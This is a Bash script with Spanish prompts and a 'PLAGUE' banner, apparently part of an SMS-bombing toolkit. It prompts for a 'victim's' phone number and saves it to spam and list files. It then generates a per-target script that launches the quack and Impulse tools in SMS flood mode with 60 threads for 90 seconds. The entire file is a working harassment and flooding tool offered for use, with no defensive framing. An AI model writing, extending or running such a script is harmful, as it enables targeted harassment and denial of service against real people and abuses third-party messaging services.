#!/bin/bash
#
# save: (26/01/2021)
#
# [Open Source] - [Código Abierto]
#
# Variables y Colores
#
PWD=$(pwd)
OS=$(uname -o)
USER=$(id -u)
verde='\033[32m'
blanco='\033[37m'
rojo='\033[31m'
azul='\033[34m'
negro='\033[0;30m'
rosa='\033[38;5;207m'
amarillo='\033[33m'
morado='\033[35m'
cian='\033[1;36m'
magenta='\033[1;35m'
#
# Mensaje de Opción Incorrecta
#
function Error {
echo -e "${rojo}
┌═════════════════════┐
█ ${blanco}¡OPCIÓN INCORRECTA! ${rojo}█
└═════════════════════┘
"${blanco}
sleep 0.5
}
#
# Banner SETSMS
#
function SETSMS {
	sleep 0.5
	clear
echo -e "${rojo}
  _____  _               _____ _    _ ______ 
 |  __ \| |        /\   / ____| |  | |  ____|
 | |__) | |       /  \ | |  __| |  | | |__   
 |  ___/| |      / /\ \| | |_ | |  | |  __|  
 | |    | |____ / ____ \ |__| | |__| | |____ 
 |_|    |______/_/    \_\_____|\____/|______|
                                             
                                            "${blanco}
}
#
# Solicitando Número Telefónico
#
function PhoneNumber {
SETSMS
echo -e -n "${verde}
┌════════════════════════════┐
█ ${blanco}INGRESE EL NÚMERO DE LA VICTIMA ${rojo}█
└════════════════════════════┘
┃    ┌═════════┐  ┌═══════════════┐
└═>>>█ ${blanco}EJEMPLO ${verde}█=>█ ${azul}+593981480757 ${rojo}█
┃    └═════════┘  └═══════════════┘
┃    ┌════════════════════════════════════════┐
└═>>>█ ${rojo}RECUERDA PONER EL NUMERO TODO JUNTO ${rojo}█
┃    └════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r PHONE
sleep 0.5
}
function Backup {
echo -e -n "${rojo}
┌══════════════════════════════════┐
█ ${blanco}INGRESE UN NOMBRE PARA EL NÚMERO ${rojo}█
└══════════════════════════════════┘
┃    ┌═════════┐  ┌═════════┐
└═>>>█ ${blanco}EJEMPLO ${verde}█=>█ ${azul}AntPlague ${rojo}█
┃    └═════════┘  └═════════┘
┃
└═>>> "${blanco}
read -r NAME
sleep 0.5
echo -e "NUMERO='${PHONE}'" >> ${RUTA}/tools/list.sh
echo -e "NOMBRE='${NAME}'" >> ${RUTA}/tools/list.sh
echo -e 'echo -e "${blanco}${NAME} ${rojo}=>${azul} ${PHONE}"
sleep 1' >> ${RUTA}/tools/list.sh
echo -e "NUMERO='${PHONE}'" >> ${RUTA}/tools/spam.sh
echo -e "NOMBRE='${NAME}'" >> ${RUTA}/tools/spam.sh
echo -e 'echo -e "${rojo}
┌══════════┐
█ ${blanco}OBJETIVO ${rojo}█
└══════════┘
${blanco}
${NAME} ${verde}=>${azul} ${PHONE}"
sleep 1' >> ${RUTA}/tools/spam.sh
echo -e "source ${RUTA}/numbers/${NAME}.sh" >> ${RUTA}/tools/spam.sh
echo -e "#!/bin/bash
cd ${RUTA}/quack
python3 quack --tool SMS --target ${PHONE} --threads 60 --timeout 90
cd ${RUTA}/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${PHONE}
cd ${RUTA}" >> ${RUTA}/numbers/${NAME}.sh
echo -e "${rojo}
┌══════════════════════════════┐
█ ${blanco}NÚMERO GUARDADO EN EL SCRIPT ${rojo}█
└══════════════════════════════┘
┃
└═>>>${blanco} ${RUTA}/numbers/${NAME}.sh"${blanco}
}
#
# Regresando al Menu Principal
#
function Restart {
echo -e "${verde}
┌════════════════════════════┐
█ ${blanco}PULSE ENTER PARA SEGUIR ${rojo}█
└════════════════════════════┘"${blanco}
read
source ${RUTA}/SETSMS.sh
}
#
# Declarando Funciones
#
PhoneNumber
Backup
Restart
